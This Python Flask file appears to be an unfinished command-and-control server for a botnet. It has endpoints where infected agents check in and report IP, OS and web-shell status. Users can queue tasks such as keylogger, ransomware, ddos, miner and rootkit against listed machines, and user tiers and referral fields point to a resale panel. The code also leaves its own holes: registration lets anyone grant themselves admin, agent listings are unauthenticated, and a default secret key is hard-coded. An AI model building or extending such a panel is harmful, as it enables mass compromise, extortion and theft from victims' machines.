# only get_all_agents has been modified to be compatible with our db
# still need all login, account, views, and action logic


import os
import time
import uuid
import json
from datetime import datetime
import mysql.connector
from flask import Flask, render_template, request, jsonify, Response, redirect, url_for, session
from dotenv import load_dotenv
from werkzeug.security import generate_password_hash, check_password_hash

# Load environment variables 
load_dotenv()
db = os.getenv("DB_DATABASE")

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "default_secret_key")

# ------------------------ BEGIN CLASSES ------------------------ #




# ------------------------ END CLASSES ------------------------ #

# ------------------------ BEGIN DATABASE FUNCTIONS ------------------------ #
# Function to retrieve DB connection
def get_db_connection():
    conn = mysql.connector.connect(
        host=os.getenv("DB_HOST"),
        user=os.getenv("DB_USER"),
        password=os.getenv("DB_PASSWORD"),
        database=os.getenv("DB_DATABASE")
    )
    return conn

def check_database():
    # Just check if we can connect to the database
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT 1")  # Simple query to test connection
        conn.close()
        print("Database connection successful")
    except mysql.connector.Error as e:
        print(f"Error connecting to database: {e}")
        exit(1)

def get_user_by_username(username):
    conn = get_db_connection()
    cursor = conn.cursor(dictionary=True)
    query = "SELECT * FROM DB_USER WHERE Username = %s"
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    conn.close()
    return user

def verify_user(username):
    conn = get_db_connection()
    cursor = conn.cursor(dictionary=True)
    query = "SELECT Username, Password FROM DB_USER WHERE Username = %s"
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    conn.close()
    return user

def create_user(username, password_hash, email=None, tier_id=1, referer=None, is_admin=False):
    conn = get_db_connection()
    cursor = conn.cursor()

    query = "INSERT INTO DB_USER (Username, Password, Email, TierID, Refers_Username, is_admin) VALUES (%s, %s, %s, %s, %s, %s)"
    cursor.execute(query, (username, password_hash, email, tier_id, referer, is_admin))
    
    conn.commit()
    conn.close()
    return username  

# Function to get all agents with their tasks
def get_all_agents():
    conn = get_db_connection()
    cursor = conn.cursor(dictionary=True)
    
    # Query agents
    query = "SELECT MachineID, IPAddress, LastCheckIn, OperatingSystem, Version, TierID FROM MACHINE"
    cursor.execute(query)
    machine_data = cursor.fetchall()
    
    # For each agent, get their tasks
    for machine in machine_data:
        MachineID = machine['MachineID']
        query = "SELECT TaskID, TaskType, Username FROM TASKS WHERE Username = %s"
        cursor.execute(query, (MachineID,))
        tasks = cursor.fetchall()
        
        # Convert to format matching the original app
        machine['ID'] = machine.pop('MachineID')
        machine['IPAddress'] = machine.pop('IPAddress')
        machine['LastCheckin'] = machine.pop('LastCheckIn')
        machine['Os'] = machine.pop('OperatingSystem')
        machine['OsVersion'] = machine.pop('Version')
        machine['TierID'] = machine.pop('TierID')
        machine['Tasks'] = []
        
        for task in tasks:
            task_data = {
                'TaskID': task['TaskID'],
                'Description': task['TaskType'],
                'AssignedBy': task['Username']
            }
            machine['Tasks'].append(task_data)
    
        # # Remove internal database ID
        # machine.pop('MachineID')
        
    conn.close()
    return machine_data

# Function to insert or update agent
def save_agent(agent_uuid, ip_address, status, os_name=None, os_version=None, web_shell_active=False):
    conn = get_db_connection()
    cursor = conn.cursor(dictionary=True)
    
    # Check if agent exists
    query = "SELECT id FROM agents WHERE uuid = %s"
    cursor.execute(query, (agent_uuid,))
    result = cursor.fetchone()
    
    if result:
        # Update existing agent
        query = """
        UPDATE agents 
        SET ip_address = %s, last_checkin = %s, status = %s, os = %s, os_version = %s, web_shell_active = %s
        WHERE uuid = %s
        """
        cursor.execute(query, (ip_address, int(time.time()), status, os_name, os_version, web_shell_active, agent_uuid))
        agent_id = result['id']
    else:
        # Insert new agent
        query = """
        INSERT INTO agents (uuid, ip_address, last_checkin, status, os, os_version, web_shell_active)
        VALUES (%s, %s, %s, %s, %s, %s, %s)
        """
        cursor.execute(query, (agent_uuid, ip_address, int(time.time()), status, os_name, os_version, web_shell_active))
        agent_id = cursor.lastrowid
    
    conn.commit()
    conn.close()
    return agent_id

# Function to add a task for an agent
def add_task(agent_id, task_id, description, status="Pending"):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    query = """
    INSERT INTO tasks (task_id, description, status, assigned_at, agent_id)
    VALUES (%s, %s, %s, %s, %s)
    """
    cursor.execute(query, (task_id, description, status, int(time.time()), agent_id))
    
    conn.commit()
    conn.close()

# Function to update task status
def update_task_status(task_id, status):
    conn = get_db_connection()
    cursor = conn.cursor()
    
    query = "UPDATE tasks SET status = %s WHERE task_id = %s"
    cursor.execute(query, (status, task_id))
    
    conn.commit()
    conn.close()

# ------------------------ END DATABASE FUNCTIONS ------------------------ #



# ------------------------ BEGIN ROUTES ------------------------ #
@app.route('/')
def index():
    print("Session contents:", session)
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('index.html', username=session['username'])

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        success = request.args.get('success')
        return render_template('login.html', success=success)

    username = request.form.get('username')
    password = request.form.get('password')

    user = verify_user(username)
    if user and check_password_hash(user['Password'], password):
        session['username'] = user['Username']
        return redirect(url_for('index'))
    else:
        return render_template('login.html', error="Invalid username or password.")
    

@app.route('/logout', methods=['POST'])
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/register', methods=['GET','POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get("password")
        email = request.form.get("email")
        tier_id = request.form.get("tier_id")
        referer = request.form.get("referer")
        if referer:
            referer_user = get_user_by_username(referer)
            if not referer_user:
                return jsonify({'message': 'Referrer username does not exist!'}), 400
        else:
            referer = None  
            
        is_admin = 'is_admin' in request.form
        
        # Check if username already exists
        user = get_user_by_username(username)
        if user:
            return jsonify({'message': 'Username already exists!'}), 409

        # Hash the password
        hashed_password = generate_password_hash(password, method='pbkdf2:sha256')

        # Create new user
        create_user(username, hashed_password, email, tier_id, referer, is_admin)
        return redirect(url_for('login', success='User created successfully'))
        
@app.route('/displayagents', methods=['GET'])
def display_agents():
    agents = get_all_agents()
    print(jsonify(agents))
    return jsonify(agents)

@app.route('/checkin', methods=['POST'])
def checkin_handler():
    # Implement checkin functionality
    return jsonify({"status": "success"})

@app.route('/deviceinfo', methods=['POST'])
def get_device_info():
    # Gets client's IP, OS, and OS version and stores it in the database
    if request.method == 'POST':
        data = request.json
        
        agent_uuid = data.get('uuid', str(uuid.uuid4()))
        ip_address = request.remote_addr
        os_name = data.get('os', '')
        os_version = data.get('os_version', '')
        
        save_agent(
            agent_uuid=agent_uuid,
            ip_address=ip_address,
            status="Active",
            os_name=os_name,
            os_version=os_version
        )
        
        return jsonify({"status": "success", "agent_id": agent_uuid})
    
    return jsonify({"status": "error", "message": "Method not allowed"}), 405

@app.route('/searchdevices', methods=['GET'])
def search_devices():
    # Implement search functionality
    return jsonify({"status": "not implemented"})

@app.route('/status', methods=['POST'])
def declare_status():
    # Checks if listener is still active on device
    if request.method == 'POST':
        data = request.json
        agent_uuid = data.get('uuid')
        
        if not agent_uuid:
            return jsonify({"status": "error", "message": "UUID required"}), 400
        
        status = data.get('status', 'Active')
        ip_address = request.remote_addr
        
        save_agent(
            agent_uuid=agent_uuid,
            ip_address=ip_address,
            status=status
        )
        
        return jsonify({"status": "success"})
    
    return jsonify({"status": "error", "message": "Method not allowed"}), 405


@app.route('/admin')
def admin_dashboard():
    if 'username' not in session:
        return redirect(url_for('login'))
    user = get_user_by_username(session['username'])
    if not user or not user['is_admin']:
        return "Forbidden: You must be an admin", 403
    return render_template('admin.html')


@app.route('/admin/add_machine', methods=['POST'])
def add_machine():
    # Ensure user is logged in + admin
    if 'username' not in session:
        return redirect(url_for('login'))
    admin_user = get_user_by_username(session['username'])
    if not admin_user or not admin_user['is_admin']:
        return "Forbidden: You must be an admin", 403

    # Gather form data
    ip_address       = request.form.get('ip_address')
    last_checkin_str = request.form.get('last_checkin')  # "2025-02-28T10:15"
    operating_system = request.form.get('operating_system')
    version          = request.form.get('version')
    cores_str        = request.form.get('cores')
    ram_str          = request.form.get('ram')
    tier_id_str      = request.form.get('tier_id')
    username         = request.form.get('username')

    # Convert numeric fields
    cores  = int(cores_str)
    ram    = int(ram_str)
    tier_id = int(tier_id_str)

    # If your DB column is a DATE or DATETIME, you can parse the string
    # or store it directly if the column is VARCHAR. E.g.:
    # last_checkin = datetime.strptime(last_checkin_str, '%Y-%m-%dT%H:%M')

    conn = get_db_connection()
    cursor = conn.cursor()

    # Insert record
    # Adapt if MachineID is auto-increment
    sql = """
    INSERT INTO MACHINE (
      IPAddress,
      LastCheckIn,
      OperatingSystem,
      Version,
      Cores,
      Ram,
      TierID,
      Username
    )
    VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
    """
    cursor.execute(sql, (
        ip_address,
        last_checkin_str,
        operating_system,
        version,
        cores,
        ram,
        tier_id,
        username
    ))
    conn.commit()
    conn.close()

    return redirect(url_for('admin_dashboard'))



@app.route('/admin/update_account', methods=['POST'])
def update_account():
    """
    Updates only the Email and/or Password of a given user, 
    leaving fields like Refers_Username, TierID, and is_admin untouched.
    """
    # 1) Ensure the request is from a logged-in admin user
    if 'username' not in session:
        return redirect(url_for('login'))

    admin_user = get_user_by_username(session['username'])
    if not admin_user or not admin_user['is_admin']:
        return "Forbidden: You must be an admin", 403

    # 2) Retrieve the username to be updated from the form
    username = request.form.get('username')
    new_email = request.form.get('email')
    new_password = request.form.get('new_password')

    # 3) Fetch the existing user from DB
    existing_user = get_user_by_username(username)
    if not existing_user:
        return "No user found with that username.", 400

    # 4) Update only what's provided:
    #     - If new_email was given, override the old email
    #     - If new_password was given, hash it & override the old password
    if new_email:
        existing_user['Email'] = new_email

    if new_password:
        hashed_pw = generate_password_hash(new_password, method='pbkdf2:sha256')
        existing_user['Password'] = hashed_pw

    # 5) Save changes to DB (only Email & Password)
    conn = get_db_connection()
    cursor = conn.cursor()
    query = """
        UPDATE DB_USER
           SET Email = %s,
               Password = %s
         WHERE Username = %s
    """
    cursor.execute(query, (
        existing_user['Email'],
        existing_user['Password'],
        username
    ))
    conn.commit()
    conn.close()

    # 6) Redirect back to admin page (or wherever you prefer)
    return redirect(url_for('admin_dashboard'))


@app.route('/tasks')
def tasks_page():
    if 'username' not in session:
        return redirect(url_for('login'))
    user = get_user_by_username(session['username'])
    # If your DB_USER has TierID, pass it in; otherwise omit
    return render_template(
        'tasks.html',
        username=user['Username'],
        tier_id=user['TierID'],
    )

@app.route('/tasks/add_task', methods=['POST'])
def add_new_task():
    """
    Handles form submissions from tasks.html.
    This updated route creates a new task in the DB.
    The form expects:
      - MachineID
      - Command (one of: keylogger, ransomware, ddos, miner, rootkit)
      - Scheduled At (a datetime-local string)
    
    Note: Adjust the INSERT statement to match your TASKS table schema.
    (For example, if your TASKS table only has columns TaskID, TaskType, Username,
    then we’ll store 'command' in TaskType and use the provided MachineID in the Username field.)
    """
    if 'username' not in session:
        return redirect(url_for('login'))
    
    # Get the form data. (We no longer need a task name or machine name.)
    machine_id = request.form.get('machine_id')  # Now expects MachineID (as a number/string)
    command    = request.form.get('command')
    scheduled_at = request.form.get('scheduled_at')  # This may need further processing if you plan to store it
    
    # (Optional) You might want to convert or validate scheduled_at here.
    
    # Insert into TASKS table.
    # NOTE: Your schema for TASKS is currently:
    #       TASKS(TaskID, TaskType, Username)
    # We'll use 'command' for TaskType and store the MachineID into the Username field.
    # If your table design is different, adjust accordingly.
    conn = get_db_connection()
    cursor = conn.cursor()
    insert_sql = """
        INSERT INTO TASKS (TaskType, Username)
        VALUES (%s, %s)
    """
    cursor.execute(insert_sql, (command, machine_id))
    conn.commit()
    conn.close()
    
    return redirect(url_for('tasks_page'))




# ------------------------ END ROUTES ------------------------ #


# ------------------------ MAIN ------------------------ #
if __name__ == '__main__':
    check_database()
    app.secret_key = os.getenv("SECRET")
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 443)), ssl_context='adhoc')
